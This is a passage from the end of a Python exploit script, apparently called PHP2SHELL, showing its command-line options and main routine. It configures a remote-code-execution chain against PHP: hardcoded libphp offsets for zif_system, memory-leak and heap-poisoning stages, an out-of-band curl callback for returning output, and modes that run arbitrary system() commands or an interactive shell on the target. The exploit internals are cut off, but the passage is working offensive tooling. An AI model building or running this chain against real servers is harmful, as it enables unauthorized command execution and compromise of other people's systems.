    ap.add_argument("--zif", type=lambda x: int(x, 0), default=0x465370,
                    help="libphp offset of zif_system (default 0x465370)")
    ap.add_argument("--dtor", type=lambda x: int(x, 0), default=0x65EB60,
                    help="libphp offset of zval_ptr_dtor (default 0x65EB60)")
    ap.add_argument("--main-bucket-count", type=int, default=MAIN_BUCKET_COUNT)
    ap.add_argument("--restart", default="",
                    help="container name or 'auto' (fresh ASLR)")
    ap.add_argument("--docker", default="docker")
    ap.add_argument("--oob", default="",
                    help="out-of-band curl callback URL (remote output)")
    ap.add_argument("--https", action="store_true",
                    help="connect to the target over TLS")
    ap.add_argument("--insecure", action="store_true",
                    help="skip TLS certificate verification")
    ap.add_argument("--sni", default="",
                    help="TLS SNI / HTTP Host override")
    ap.add_argument("--multi", action="store_true",
                    help="multi-worker poisoning mode (A1 wave, B1, A2 waves, B2)")
    ap.add_argument("--a1-workers", type=int, default=4,
                    help="A1 poison concurrency (default 4)")
    ap.add_argument("--a1-waves", type=int, default=1,
                    help="A1 poison waves (default 1)")
    ap.add_argument("--b1-retries", type=int, default=3,
                    help="B1 leak retries (default 3)")
    ap.add_argument("--a2-workers", type=int, default=8,
                    help="A2 poison concurrency (default 8)")
    ap.add_argument("--a2-waves", type=int, default=2,
                    help="A2 poison waves (default 2)")
    ap.add_argument("--b2-retries", type=int, default=3,
                    help="B2 retries per main candidate (default 3)")
    group = ap.add_mutually_exclusive_group()
    group.add_argument("--exec", dest="exec_cmd", default=None,
                       help="run one command through the chain and exit")
    group.add_argument("--raw-cmd", default=None,
                       help="send one raw system() command (no output wrapper)")
    group.add_argument("--leak", action="store_true",
                       help="run A1+B1 only and print runtime addresses")
    ap.add_argument("--log", default="", help="append a transcript to this file")
    ap.add_argument("--no-banner", action="store_true")
    return ap


def main() -> int:
    args = build_parser().parse_args()
    t = Target(
        host=args.host, port=args.port, path=args.path,
        outdir=os.path.abspath(args.outdir), timeout=args.timeout,
        retries=args.retries, zif_off=args.zif, dtor_off=args.dtor,
        main_bucket_count=args.main_bucket_count,
        docker=args.docker, restart=args.restart, oob=args.oob,
        tls=args.https, tls_insecure=args.insecure, sni=args.sni,
        multi=args.multi, a1_workers=args.a1_workers,
        a1_waves=args.a1_waves, b1_retries=args.b1_retries,
        a2_workers=args.a2_workers, a2_waves=args.a2_waves,
        b2_retries=args.b2_retries,
    )
    log = Logger(args.log)
    try:
        if not args.no_banner:
            log("=== PHP2SHELL official target — HTTP/TLS ===")
            log("target: %s" % target_url(t))
            log("outdir: %s" % t.outdir)
            log("mode: %s" % ("multi-worker poisoning"
                              if t.multi else "single-worker chain"))
        if args.leak:
            return 0 if leak_target(t, log) else 1
        if args.exec_cmd is not None:
            res = execute(t, args.exec_cmd, log)
            return 0 if res.ok else 1
        if args.raw_cmd is not None:
            res = execute(t, args.raw_cmd, log, raw=True)
            return 0 if res.ok else 1
        repl(t, log)
        return 0
    finally:
        log.close()


if __name__ == "__main__":
    raise SystemExit(main())
